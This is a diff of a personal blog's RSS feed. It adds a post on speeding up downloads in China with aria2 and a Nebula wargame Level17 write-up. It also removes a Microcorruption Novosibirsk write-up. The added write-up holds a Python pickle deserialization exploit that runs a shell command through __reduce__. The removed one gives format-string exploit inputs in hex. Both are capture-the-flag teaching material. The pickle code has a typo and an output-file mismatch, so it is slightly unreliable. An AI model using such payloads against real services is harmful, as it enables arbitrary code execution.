@@ -5,9 +5,33 @@
     <description>Random thoughts and random solutions on computer science</description>
     <link>zijunh.github.io/</link>
     <atom:link href="zijunh.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 09 Dec 2019 23:24:44 +1100</pubDate>
-    <lastBuildDate>Mon, 09 Dec 2019 23:24:44 +1100</lastBuildDate>
+    <pubDate>Mon, 06 Jan 2020 21:34:10 +1100</pubDate>
+    <lastBuildDate>Mon, 06 Jan 2020 21:34:10 +1100</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>aria2 assisted downloading in China</title>
+        <description>&lt;p&gt;Those who have been to China are often frustrated by the restrictions imposed by the Great Fire Wall of China (GFW). Even though VPNs are available to bypass the restrictions, they are often very slow or unstable. However, even for foreign websites that are not blocked by the GFW, accessing them is extremely slow. This becomes extremely problematic when you need to download large files, such as software updates or other essential files. The slow speed of software updates can be remedied by changing mirror sites to those local to China. However, the file I needed was only hosted on 1 website. The speeds were painstakingly slow (often ~90kb/s), it would take hours to download a 1GB file, even when I have a bandwidth of 100MBps.&lt;/p&gt;
+
+&lt;p&gt;To solve this problem, the idea of parallel downloading can be introduced. &lt;a href=&quot;https://github.com/aria2/aria2&quot;&gt;aria2&lt;/a&gt; is such a tool. It allows connection to single or multiple hosts from the same machine. This allows multiple connections to the same host to increase the download speed. Each connection downloads a chunk, and when a chunk is downloaded, a new connection is made to download the next chunk. “-s” specifies the number of connections to the hosts, “-k” specifies the size of each chunk, and “-x” specifies the maximum number of connections. The full documentation is &lt;a href=&quot;https://aria2.github.io/manual/en/html/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The arguments I used were:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aria2c.exe -x16 -s16 -k1M link
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note this method requires manually downloading the file. Perhaps manual interference can be omitted by writing a local proxy that automatically does this. However, I am not a network expert so this will be a task for the readers (or when I do become a network expert).&lt;/p&gt;
+</description>
+        <pubDate>Wed, 18 Dec 2019 20:31:24 +1100</pubDate>
+        <link>zijunh.github.io/2019/12/china-download/</link>
+        <guid isPermaLink="true">zijunh.github.io/2019/12/china-download/</guid>
+        
+        <category>discussion</category>
+        
+        
+        <category>random</category>
+        
+      </item>
     
       <item>
         <title>TLE and memset in competitive programming</title>
@@ -356,6 +380,25 @@ exit_group(11)                          = ?
 
 &lt;h2 id=&quot;level17&quot;&gt;Level17&lt;/h2&gt;
 
+&lt;p&gt;This level requires abusing security risks within python’s &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt; module. On python’s official documentation &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt;&lt;/a&gt;, it is well documented it can run arbitary code. As the vulnerable python file is ran under the “flag17” account, we use it to achieve our desired effect. Further investigation online reveals that the &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; method of the pickled class is ran when loading the pickled data. Therefore, the goal is to dump a pickled object with a custom &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; method and send it to the desired port.&lt;/p&gt;
+
+&lt;p&gt;The code we want to run is &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;. As stdout is not displayed, we need to pipe it into a file. I selected a random file in “/tmp”. The full python code is as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;picke&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'getflag &amp;gt; /tmp/res.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run the above code using &lt;code class=&quot;highlighter-rouge&quot;&gt;python2&lt;/code&gt;, and check the contents of the file “/tmp/t.txt”. It should contain the desired output, indicating this level is solved.&lt;/p&gt;
 </description>
         <pubDate>Tue, 25 Jun 2019 23:44:38 +1000</pubDate>
         <link>zijunh.github.io/2019/06/nebulla-part-2/</link>
@@ -1579,84 +1622,6 @@ if (!r14.IN_USE){
         <pubDate>Wed, 23 Jan 2019 15:37:10 +1100</pubDate>
         <link>zijunh.github.io/2019/01/algiers/</link>
         <guid isPermaLink="true">zijunh.github.io/2019/01/algiers/</guid>
-        
-        <category>microcorruption</category>
-        
-        <category>solution</category>
-        
-        <category>wargames</category>
-        
-        
-        <category>microcorruption</category>
-        
-      </item>
-    
-      <item>
-        <title>Microcorruption - Novosibirsk: Write-up</title>
-        <description>&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;
-
-&lt;p&gt;For this particular problem, the user can only input one string in the form of &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;
-
-&lt;p&gt;This problem uses the same technique as the previous problem, Addis Ababa. If you haven’t read the &lt;a href=&quot;/2019/01/addis-ababa/&quot;&gt;write-up&lt;/a&gt; for that one, I strongly suggest you do so.&lt;/p&gt;
-
-&lt;p&gt;There are many ways to tackle this problem. Observe the allowed input length for this problem is 0x1f4, hinting a long input string can be used for the exploit. As we know the memory will be changed after the &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; function, we will focus on the code after the &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; for the input.&lt;/p&gt;
-
-&lt;p&gt;As you may remember in previous questions, providing a the &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; function an argument of “0x7f” will open the door automatically, and fortunately, both &lt;code class=&quot;highlighter-rouge&quot;&gt;putchar&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt; have calls to &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;. This value is also less the the allowed input length of 0x1f4, making this attack viable.&lt;/p&gt;
-
-&lt;p&gt;Arguments are usually passed to functions by pushing them onto the stack. The “push” instruction for &lt;code class=&quot;highlighter-rouge&quot;&gt;putchar&lt;/code&gt; has no arguments and pushes the default value of 0x0, preventing plans to change the argument to 0x7f. &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt;, however, includes a “push” with the argument 0x7e, and we are able to override this value to 0x7f by making the length of the printed string 0x7f.&lt;/p&gt;
-
-&lt;h2 id=&quot;the-first-solution&quot;&gt;The (first) solution&lt;/h2&gt;
-
-&lt;p&gt;This solution has 3 parts: the address to the argument of “push” in &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt;, padding to make the printed portion of the string 0x7f long, %n to overwrite.&lt;/p&gt;
-
-&lt;p&gt;For me the answer (hex) was:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c8441111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111256e
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;the-second-solution&quot;&gt;The (second) solution&lt;/h2&gt;
-
-&lt;p&gt;Naturally, I went to check the hall of fame to see how others were doing. To my suprise, I found the minimal input size was only &lt;strong&gt;5 bytes&lt;/strong&gt;!! This prompted me to explore other possible solutions. When format string vulnerabilities were discovered, a common way to increase the string length was to use %&lt;em&gt;n&lt;/em&gt;s, where &lt;em&gt;n&lt;/em&gt; is a number. This pads the string, and increases the output size. However, it did not work when I tried (perhaps this is not a complete replication of the C &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;)&lt;/p&gt;
-
-&lt;p&gt;But when I was trying this method, I realised there was a large area of junk memory at the end of the dump, ranging from ff80 to fff0. In &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;, %s reads a string starting from the position indicated by the argument until it reaches a null character \0, which is indicated by 0x0. This character is observed at fffe, and there are 0x7f bytes of non-null characters before it. Therefore we can direct &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; to print these characters using %s, which prints out the junk memory, and uses it as padding.&lt;/p&gt;
-
-&lt;p&gt;The solution has the following components: address of starting character in the junk memory that pads the total length of the printed string to 0x7f, the address to the argument of “push” in &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt;, %s to read string, %n to overwrite.&lt;/p&gt;
-
-&lt;p&gt;For me the answer (hex) was:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;83ffc8442573256e
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is only 8 bytes!&lt;/p&gt;
-
-&lt;h2 id=&quot;the-third-solution&quot;&gt;The (third) solution&lt;/h2&gt;
-
-&lt;p&gt;Though we are close, we are still 3 bytes and a lot of cpu cycles away from the best solution. To be fair, I was stuck here for a while. There is a brief discussion on reddit, which you can read &lt;a href=&quot;https://www.reddit.com/r/securityCTF/comments/8726mt/microcorruption_novosibirsk_min_input_of_5/&quot;&gt;here&lt;/a&gt;. As there are fewer cpu cycles, changing the memory must have affected the program earlier. The only possible way to solve the challenge is to provide &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; 0x7f. The only function that calls &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; before &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;putchar&lt;/code&gt;. By putting a breakpoint before the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;, we can see the stack pointer is only 2 bytes away from a character in user input.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pic1.png&quot; alt=&quot;Stack pointer and memory location&quot; /&gt;
-&lt;em&gt;Figure showing memory address location, @ is user input&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;As %n can only write the length of printed characters, we are limited to writing 2 or 3 characters. Using the disassembler on the website, 0200 provides the instruction “rrc sr”, and 0300 provides “rrc #0x0”. Both are viable instructions that do not have big influences on the execution of &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; (sr is overwritten by r15 in &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;). Thus, we can overwrite one of the push instructions in &lt;code class=&quot;highlighter-rouge&quot;&gt;putchar&lt;/code&gt;, and when &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; is called, the stack pointer points to the character we entered after overwriting, and passes it as an argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;This forms the basis of our solution: address pointing towards “push” in &lt;code class=&quot;highlighter-rouge&quot;&gt;putchar&lt;/code&gt; before &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;, %n to overwrite the insturction with “rrc”, and 7f, which will be passed as argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The solution is then the following (hex):&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;5245256e7f
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we no longer need to wait for &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; to finish, it uses less cycles and only requires 5 bytes of input.&lt;/p&gt;
-
-&lt;h2 id=&quot;read-more&quot;&gt;Read More&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&quot;&gt;Exploiting Format String Vulnerabilities&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 11 Jan 2019 14:33:12 +1100</pubDate>
-        <link>zijunh.github.io/2019/01/novosibirsk/</link>
-        <guid isPermaLink="true">zijunh.github.io/2019/01/novosibirsk/</guid>
         
         <category>microcorruption</category>
         
